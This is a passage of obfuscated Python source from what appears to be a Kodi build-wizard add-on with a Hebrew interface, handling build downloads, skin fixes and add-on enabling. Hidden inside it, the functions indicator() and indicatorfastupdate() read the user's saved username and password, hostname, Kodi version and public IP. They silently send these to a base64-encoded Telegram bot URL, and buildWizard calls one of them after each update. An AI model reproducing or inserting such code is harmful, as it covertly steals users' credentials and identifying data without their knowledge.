                      OOOOO0O0O0OOOO0OO =int (((O0O00OOOOOOO0000O -O0OO0O0000O0000O0 )/1024 )/(OOOOO0OO000O0O00O ))#line:3386
                    else :#line:3387
                      OOOOO0O0O0OOOO0OO =0 #line:3388
                    OO0O000OOO0O00O00 .update (int (O0OO000OOO0O00O00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO000OOO0O00O00 ,O0OO0O0000O0000O0 /(1024 *1024 ),O0O00OOOOOOO0000O /(1000 *1000 ),OOOOO0OO000O0O00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOO0O0O0OOOO0OO ,60 ))#line:3390
                    O00000OOO00000O00 +=1 #line:3391
                    if OO0O000OOO0O00O00 .iscanceled ():#line:3392
                     OO0O000OOO0O00O00 .close ()#line:3393
                     break #line:3394
    OO00O00O0OO0OO000 ="https://docs.google.com/uc?export=download"#line:3395
    import urllib2 #line:3400
    import cookielib #line:3401
    from cookielib import CookieJar #line:3403
    O0000OOO0O0OOO0OO =CookieJar ()#line:3405
    OOO00O00OO000OOOO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0000OOO0O0OOO0OO ))#line:3406
    OOOOO000O0O0OOOOO ={'id':OOOO0O000OO00OO0O }#line:3408
    O00O0OO0OO00O000O =urllib .urlencode (OOOOO000O0O0OOOOO )#line:3409
    logging .warning (OO00O00O0OO0OO000 +'&'+O00O0OO0OO00O000O )#line:3410
    OOO0OOO000O00O0OO =OOO00O00OO000OOOO .open (OO00O00O0OO0OO000 +'&'+O00O0OO0OO00O000O )#line:3411
    O0OO00O0OO000O000 =OOO0OOO000O00O0OO .read ()#line:3412
    for O0OOOO0OO0O0OOOO0 in O0000OOO0O0OOO0OO :#line:3414
         logging .warning (O0OOOO0OO0O0OOOO0 )#line:3415
    O0O0000OOO00OOOO0 =O00OO0000OOOOOO0O (O0000OOO0O0OOO0OO )#line:3416
    logging .warning (O0O0000OOO00OOOO0 )#line:3417
    if O0O0000OOO00OOOO0 :#line:3418
        O0O0OOOOO000O0OOO ={'id':OOOO0O000OO00OO0O ,'confirm':O0O0000OOO00OOOO0 }#line:3419
        O0000OOO0OO0O0000 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3420
        O00O0OO0OO00O000O =urllib .urlencode (O0O0OOOOO000O0OOO )#line:3421
        OOO0OOO000O00O0OO =OOO00O00OO000OOOO .open (OO00O00O0OO0OO000 +'&'+O00O0OO0OO00O000O )#line:3422
        chunk_read (OOO0OOO000O00O0OO ,report_hook =chunk_report ,dp =OO0O000OOO0O00O00 ,destination =OOOO00O0O0OOO00O0 ,filesize =O0000O0O000OO0OOO )#line:3423
    return (O0O0OOOOO0000OOO0 )#line:3427
def kodi17Fix ():#line:3428
	OOOO0OOO0O0OO00OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3429
	OOOOOOOO000O0O0OO =[]#line:3430
	for O0O00O00OOO0OO000 in sorted (OOOO0OOO0O0OO00OO ,key =lambda OO000O000O00OOO00 :OO000O000O00OOO00 ):#line:3431
		OO0O0OO0OOO0O0000 =os .path .join (O0O00O00OOO0OO000 ,'addon.xml')#line:3432
		if os .path .exists (OO0O0OO0OOO0O0000 ):#line:3433
			O0OO00OO0O0OOOO0O =O0O00O00OOO0OO000 .replace (ADDONS ,'')[1 :-1 ]#line:3434
			O00OOOO00O0O0O0OO =open (OO0O0OO0OOO0O0000 )#line:3435
			O0OO00OO0O000OO0O =O00OOOO00O0O0O0OO .read ()#line:3436
			O0OO0OOOOOO000O00 =parseDOM (O0OO00OO0O000OO0O ,'addon',ret ='id')#line:3437
			O00OOOO00O0O0O0OO .close ()#line:3438
			try :#line:3439
				OO0O0000O0O000O00 =xbmcaddon .Addon (id =O0OO0OOOOOO000O00 [0 ])#line:3440
			except :#line:3441
				try :#line:3442
					log ("%s was disabled"%O0OO0OOOOOO000O00 [0 ],xbmc .LOGDEBUG )#line:3443
					OOOOOOOO000O0O0OO .append (O0OO0OOOOOO000O00 [0 ])#line:3444
				except :#line:3445
					try :#line:3446
						log ("%s was disabled"%O0OO00OO0O0OOOO0O ,xbmc .LOGDEBUG )#line:3447
						OOOOOOOO000O0O0OO .append (O0OO00OO0O0OOOO0O )#line:3448
					except :#line:3449
						if len (O0OO0OOOOOO000O00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OO00OO0O0OOOO0O ,xbmc .LOGERROR )#line:3450
						else :log ("Unabled to enable: %s"%O0O00O00OOO0OO000 ,xbmc .LOGERROR )#line:3451
	if len (OOOOOOOO000O0O0OO )>0 :#line:3452
		O0OOO0OO0000OOO0O =0 #line:3453
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3454
		for OO0OO0OOO0OOO0O0O in OOOOOOOO000O0O0OO :#line:3455
			O0OOO0OO0000OOO0O +=1 #line:3456
			O0OOOOO00OO00O00O =int (percentage (O0OOO0OO0000OOO0O ,len (OOOOOOOO000O0O0OO )))#line:3457
			DP .update (O0OOOOO00OO00O00O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0OOO0OOO0O0O ))#line:3458
			addonDatabase (OO0OO0OOO0OOO0O0O ,1 )#line:3459
			if DP .iscanceled ():break #line:3460
		if DP .iscanceled ():#line:3461
			DP .close ()#line:3462
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3463
			sys .exit ()#line:3464
		DP .close ()#line:3465
	forceUpdate ()#line:3466
def indicator ():#line:3468
       try :#line:3469
          import json #line:3470
          wiz .log ('FRESH MESSAGE')#line:3471
          O0O0O00OO00OOO0O0 =(ADDON .getSetting ("user"))#line:3472
          OOO0OOOOOO0000O0O =(ADDON .getSetting ("pass"))#line:3473
          O00O00O00O00O0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3474
          O0O0O0O0O0O00O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3475
          O000000O00000OO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3476
          O0O0O00O0O0OO0O00 =str (json .loads (O000000O00000OO00 )['ip'])#line:3477
          O00O000O0O0O0OOOO =O0O0O00OO00OOO0O0 #line:3478
          O0O0OOO000O0OO0O0 =OOO0OOOOOO0000O0O #line:3479
          import socket #line:3480
          O000000O00000OO00 =urllib2 .urlopen (O0O0O0O0O0O00O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00O000O0O0O0OOOO +' - '+O0O0OOO000O0OO0O0 +' - '+O00O00O00O00O0O0O +' - '+O0O0O00O0O0OO0O00 ).readlines ()#line:3481
       except :pass #line:3483
def indicatorfastupdate ():#line:3485
       try :#line:3486
          import json #line:3487
          wiz .log ('FRESH MESSAGE')#line:3488
          OOO00OO0O0OO00O0O =(ADDON .getSetting ("user"))#line:3489
          O0OOO0OO0OO0O00OO =(ADDON .getSetting ("pass"))#line:3490
          OOOOOO00O0OO00000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3491
          O00OO00O0OO000O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3493
          OO000OOO0000O000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3494
          O0OO0OOO00000000O =str (json .loads (OO000OOO0000O000O )['ip'])#line:3495
          O0O00OO0OO0OO0OOO =OOO00OO0O0OO00O0O #line:3496
          OOOO00000O0000000 =O0OOO0OO0OO0O00OO #line:3497
          import socket #line:3499
          OO000OOO0000O000O =urllib2 .urlopen (O00OO00O0OO000O0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O00OO0OO0OO0OOO +' - '+OOOO00000O0000000 +' - '+OOOOOO00O0OO00000 +' - '+O0OO0OOO00000000O ).readlines ()#line:3500
       except :pass #line:3502
def skinfix18 ():#line:3504
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3505
		O0O0OO00O0OOO00O0 =wiz .workingURL (SKINID18DDONXML )#line:3506
		if O0O0OO00O0OOO00O0 ==True :#line:3507
			OO00OOOO0OOOOO0OO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3508
			if len (OO00OOOO0OOOOO0OO )>0 :#line:3509
				O0OO0O0O00OOO000O ='%s-%s.zip'%(SKINID18 ,OO00OOOO0OOOOO0OO [0 ])#line:3510
				O0OO0OO00000OOOOO =wiz .workingURL (SKIN18ZIPURL +O0OO0O0O00OOO000O )#line:3511
				if O0OO0OO00000OOOOO ==True :#line:3512
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3513
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3514
					OOOOOOOOOO0000O00 =os .path .join (PACKAGES ,O0OO0O0O00OOO000O )#line:3515
					try :os .remove (OOOOOOOOOO0000O00 )#line:3516
					except :pass #line:3517
					downloader .download (SKIN18ZIPURL +O0OO0O0O00OOO000O ,OOOOOOOOOO0000O00 ,DP )#line:3518
					extract .all (OOOOOOOOOO0000O00 ,HOME ,DP )#line:3519
					try :#line:3520
						OO0000O000O000OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3521
						OO00O0O000OOO000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3522
						os .rename (OO0000O000O000OO0 ,OO00O0O000OOO000O )#line:3523
					except :#line:3524
						pass #line:3525
					try :#line:3526
						OOOO0O00OOO0O00O0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0OOO0O000O0OOO0 =OOOO0O00OOO0O00O0 .read ();OOOO0O00OOO0O00O0 .close ()#line:3527
						O0OO0000OOO0O0O0O =wiz .parseDOM (OO0OOO0O000O0OOO0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3528
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000OOO0O0O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3529
					except :#line:3530
						pass #line:3531
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3532
					DP .close ()#line:3533
					xbmc .sleep (500 )#line:3534
					wiz .forceUpdate (True )#line:3535
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3536
				else :#line:3537
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3538
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO0OO00000OOOOO ,xbmc .LOGERROR )#line:3539
			else :#line:3540
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3541
		else :#line:3542
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3543
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3544
def skinfix17 ():#line:3545
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3546
		OO0OO000O0OO0OOOO =wiz .workingURL (SKINID17DDONXML )#line:3547
		if OO0OO000O0OO0OOOO ==True :#line:3548
			OO0O0O0000000OO00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3549
			if len (OO0O0O0000000OO00 )>0 :#line:3550
				O0OOO00O0000OOOOO ='%s-%s.zip'%(SKINID17 ,OO0O0O0000000OO00 [0 ])#line:3551
				O00O0O000OOOOO0O0 =wiz .workingURL (SKIN17ZIPURL +O0OOO00O0000OOOOO )#line:3552
				if O00O0O000OOOOO0O0 ==True :#line:3553
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3554
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3555
					O0000000OO0OO0OOO =os .path .join (PACKAGES ,O0OOO00O0000OOOOO )#line:3556
					try :os .remove (O0000000OO0OO0OOO )#line:3557
					except :pass #line:3558
					downloader .download (SKIN17ZIPURL +O0OOO00O0000OOOOO ,O0000000OO0OO0OOO ,DP )#line:3559
					extract .all (O0000000OO0OO0OOO ,HOME ,DP )#line:3560
					try :#line:3561
						O0O00O0O0000O00OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3562
						O00OO00O0OO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3563
						os .rename (O0O00O0O0000O00OO ,O00OO00O0OO0OOOOO )#line:3564
					except :#line:3565
						pass #line:3566
					try :#line:3567
						OOO0O0O00O0O0OOOO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O0000O000000OO0 =OOO0O0O00O0O0OOOO .read ();OOO0O0O00O0O0OOOO .close ()#line:3568
						OOO000OO0OO0OO0O0 =wiz .parseDOM (O0O0000O000000OO0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3569
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000OO0OO0OO0O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3570
					except :#line:3571
						pass #line:3572
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3573
					DP .close ()#line:3574
					xbmc .sleep (500 )#line:3575
					wiz .forceUpdate (True )#line:3576
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3577
				else :#line:3578
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3579
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00O0O000OOOOO0O0 ,xbmc .LOGERROR )#line:3580
			else :#line:3581
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3582
		else :#line:3583
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3584
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3585
def fix17update ():#line:3586
	if KODIV >=17 and KODIV <18 :#line:3587
		wiz .kodi17Fix ()#line:3588
		xbmc .sleep (4000 )#line:3589
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3590
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3591
		fixfont ()#line:3592
		OO0OOO0O0O0OO0O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3593
		try :#line:3595
			O000OOO0000O000O0 =open (OO0OOO0O0O0OO0O00 ,'r')#line:3596
			O0000OOOOO0OOO0OO =O000OOO0000O000O0 .read ()#line:3597
			O000OOO0000O000O0 .close ()#line:3598
			OO0O0OOOOOOOOOO0O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3599
			OO0O0OO0OO0OO00OO =re .compile (OO0O0OOOOOOOOOO0O ).findall (O0000OOOOO0OOO0OO )[0 ]#line:3600
			O000OOO0000O000O0 =open (OO0OOO0O0O0OO0O00 ,'w')#line:3601
			O000OOO0000O000O0 .write (O0000OOOOO0OOO0OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO0O0OO0OO0OO00OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3602
			O000OOO0000O000O0 .close ()#line:3603
		except :#line:3604
				pass #line:3605
		wiz .kodi17Fix ()#line:3606
		OO0OOO0O0O0OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3607
		try :#line:3608
			O000OOO0000O000O0 =open (OO0OOO0O0O0OO0O00 ,'r')#line:3609
			O0000OOOOO0OOO0OO =O000OOO0000O000O0 .read ()#line:3610
			O000OOO0000O000O0 .close ()#line:3611
			OO0O0OOOOOOOOOO0O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3612
			OO0O0OO0OO0OO00OO =re .compile (OO0O0OOOOOOOOOO0O ).findall (O0000OOOOO0OOO0OO )[0 ]#line:3613
			O000OOO0000O000O0 =open (OO0OOO0O0O0OO0O00 ,'w')#line:3614
			O000OOO0000O000O0 .write (O0000OOOOO0OOO0OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO0O0OO0OO0OO00OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3615
			O000OOO0000O000O0 .close ()#line:3616
		except :#line:3617
				pass #line:3618
		swapSkins ('skin.Premium.mod')#line:3619
def fix18update ():#line:3621
	if KODIV >=18 :#line:3622
		xbmc .sleep (4000 )#line:3623
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3624
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3625
		fixfont ()#line:3626
		O0O0OO0OO0OOOOOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3627
		try :#line:3628
			OOO00OO0OOOO0O0O0 =open (O0O0OO0OO0OOOOOOO ,'r')#line:3629
			OO00O0O00OO0O0O0O =OOO00OO0OOOO0O0O0 .read ()#line:3630
			OOO00OO0OOOO0O0O0 .close ()#line:3631
			O0OOOO000OO0O00OO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3632
			O0O0OO0OOOO0O0O0O =re .compile (O0OOOO000OO0O00OO ).findall (OO00O0O00OO0O0O0O )[0 ]#line:3633
			OOO00OO0OOOO0O0O0 =open (O0O0OO0OO0OOOOOOO ,'w')#line:3634
			OOO00OO0OOOO0O0O0 .write (OO00O0O00OO0O0O0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0O0OO0OOOO0O0O0O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3635
			OOO00OO0OOOO0O0O0 .close ()#line:3636
		except :#line:3637
				pass #line:3638
		wiz .kodi17Fix ()#line:3639
		O0O0OO0OO0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3640
		try :#line:3641
			OOO00OO0OOOO0O0O0 =open (O0O0OO0OO0OOOOOOO ,'r')#line:3642
			OO00O0O00OO0O0O0O =OOO00OO0OOOO0O0O0 .read ()#line:3643
			OOO00OO0OOOO0O0O0 .close ()#line:3644
			O0OOOO000OO0O00OO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3645
			O0O0OO0OOOO0O0O0O =re .compile (O0OOOO000OO0O00OO ).findall (OO00O0O00OO0O0O0O )[0 ]#line:3646
			OOO00OO0OOOO0O0O0 =open (O0O0OO0OO0OOOOOOO ,'w')#line:3647
			OOO00OO0OOOO0O0O0 .write (OO00O0O00OO0O0O0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0O0OO0OOOO0O0O0O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3648
			OOO00OO0OOOO0O0O0 .close ()#line:3649
		except :#line:3650
				pass #line:3651
		swapSkins ('skin.Premium.mod')#line:3652
def buildWizard (OO0OO0O0O0O00O0OO ,O000OOO00O000O0OO ,theme =None ,over =False ):#line:3655
	if over ==False :#line:3656
		O00O00O0OO0OO00O0 =wiz .checkBuild (OO0OO0O0O0O00O0OO ,'url')#line:3657
		if O00O00O0OO0OO00O0 ==False :#line:3659
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3664
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3665
			return #line:3666
		O00O0000O0O0O000O =wiz .workingURL (O00O00O0OO0OO00O0 )#line:3667
		if O00O0000O0O0O000O ==False :#line:3668
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00O0000O0O0O000O ))#line:3669
			return #line:3670
	if O000OOO00O000O0OO =='gui':#line:3671
		if OO0OO0O0O0O00O0OO ==BUILDNAME :#line:3672
			if over ==True :OOO0000OO0000OO00 =1 #line:3673
			else :OOO0000OO0000OO00 =1 #line:3674
		else :#line:3675
			OOO0000OO0000OO00 =1 #line:3676
		if OOO0000OO0000OO00 :#line:3677
			remove_addons ()#line:3678
			remove_addons2 ()#line:3679
			O000OOO000OO0O00O =wiz .checkBuild (OO0OO0O0O0O00O0OO ,'gui')#line:3680
			O0OOOO0O000OOOO0O =OO0OO0O0O0O00O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3681
			if not wiz .workingURL (O000OOO000OO0O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3682
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3683
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO ),'','אנא המתן')#line:3684
			O0000O000O000O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOO0O000OOOO0O )#line:3685
			try :os .remove (O0000O000O000O0OO )#line:3686
			except :pass #line:3687
			logging .warning (O000OOO000OO0O00O )#line:3688
			if 'google'in O000OOO000OO0O00O :#line:3689
			   O000O00O0OOO00000 =googledrive_download (O000OOO000OO0O00O ,O0000O000O000O0OO ,DP ,wiz .checkBuild (OO0OO0O0O0O00O0OO ,'filesize'))#line:3690
			else :#line:3693
			  downloader .download (O000OOO000OO0O00O ,O0000O000O000O0OO ,DP )#line:3694
			xbmc .sleep (100 )#line:3695
			O00OOOO00000OOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO )#line:3696
			DP .update (0 ,O00OOOO00000OOOOO ,'','אנא המתן')#line:3697
			extract .all (O0000O000O000O0OO ,HOME ,DP ,title =O00OOOO00000OOOOO )#line:3698
			DP .close ()#line:3699
			wiz .defaultSkin ()#line:3700
			wiz .lookandFeelData ('save')#line:3701
			wiz .kodi17Fix ()#line:3702
			if KODIV >=18 :#line:3703
				skindialogsettind18 ()#line:3704
			xbmc .executebuiltin ("ReloadSkin()")#line:3705
			if INSTALLMETHOD ==1 :OO00O000OO00OOO0O =1 #line:3706
			elif INSTALLMETHOD ==2 :OO00O000OO00OOO0O =0 #line:3707
			else :DP .close ()#line:3708
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3709
			indicatorfastupdate ()#line:3710
		else :#line:3712
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3713
	if O000OOO00O000O0OO =='gui2':#line:3714
		if OO0OO0O0O0O00O0OO ==BUILDNAME :#line:3715
			if over ==True :OOO0000OO0000OO00 =1 #line:3716
			else :OOO0000OO0000OO00 =1 #line:3717
		else :#line:3718
			OOO0000OO0000OO00 =1 #line:3719
		if OOO0000OO0000OO00 :#line:3720
			remove_addons ()#line:3721
			remove_addons2 ()#line:3722
			O000OOO000OO0O00O =wiz .checkBuild (OO0OO0O0O0O00O0OO ,'gui')#line:3723
			O0OOOO0O000OOOO0O =OO0OO0O0O0O00O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3724
			if not wiz .workingURL (O000OOO000OO0O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3725
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3726
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO ),'','אנא המתן')#line:3727
			O0000O000O000O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOO0O000OOOO0O )#line:3728
			try :os .remove (O0000O000O000O0OO )#line:3729
			except :pass #line:3730
			logging .warning (O000OOO000OO0O00O )#line:3731
			if 'google'in O000OOO000OO0O00O :#line:3732
			   O000O00O0OOO00000 =googledrive_download (O000OOO000OO0O00O ,O0000O000O000O0OO ,DP ,wiz .checkBuild (OO0OO0O0O0O00O0OO ,'filesize'))#line:3733
			else :#line:3736
			  downloader .download (O000OOO000OO0O00O ,O0000O000O000O0OO ,DP )#line:3737
			xbmc .sleep (100 )#line:3738
			O00OOOO00000OOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O0O00O0OO )#line:3739
			DP .update (0 ,O00OOOO00000OOOOO ,'','אנא המתן')#line:3740
			extract .all (O0000O000O000O0OO ,HOME ,DP ,title =O00OOOO00000OOOOO )#line:3741
			DP .close ()#line:3742
			wiz .defaultSkin ()#line:3743
			wiz .lookandFeelData ('save')#line:3744
			if INSTALLMETHOD ==1 :OO00O000OO00OOO0O =1 #line:3747
			elif INSTALLMETHOD ==2 :OO00O000OO00OOO0O =0 #line:3748
			else :DP .close ()#line:3749
		else :#line:3751
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3752
	elif O000OOO00O000O0OO =='fresh':#line:3753
		freshStart (OO0OO0O0O0O00O0OO )#line:3754
	elif O000OOO00O000O0OO =='normal':#line:3755
		if url =='normal':#line:3756
			if KEEPTRAKT =='true':#line:3757
				traktit .autoUpdate ('all')#line:3758
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3759
			if KEEPREAL =='true':#line:3760
				debridit .autoUpdate ('all')#line:3761
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3762
			if KEEPLOGIN =='true':#line:3763
				loginit .autoUpdate ('all')#line:3764
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3765
		O0O0O0O00OO000O00 =int (KODIV );O0000O0000O0O0000 =int (float (wiz .checkBuild (OO0OO0O0O0O00O0OO ,'kodi')))#line:3766
		if not O0O0O0O00OO000O00 ==O0000O0000O0O0000 :#line:3767
			if O0O0O0O00OO000O00 ==16 and O0000O0000O0O0000 <=15 :O0OOOO00O0O0OO0OO =False #line:3768
			else :O0OOOO00O0O0OO0OO =True #line:3769
		else :O0OOOO00O0O0OO0OO =False #line:3770
		if O0OOOO00O0O0OO0OO ==True :#line:3771
			OO0OOOOOOOOO0O0OO =1 #line:3772
		else :#line:3773
			if not over ==False :OO0OOOOOOOOO0O0OO =1 #line:3774
			else :OO0OOOOOOOOO0O0OO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3775
		if OO0OOOOOOOOO0O0OO :#line:3776
			wiz .clearS ('build')#line:3777
			O000OOO000OO0O00O =wiz .checkBuild (OO0OO0O0O0O00O0OO ,'url')#line:3778
			O0OOOO0O000OOOO0O =OO0OO0O0O0O00O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3779
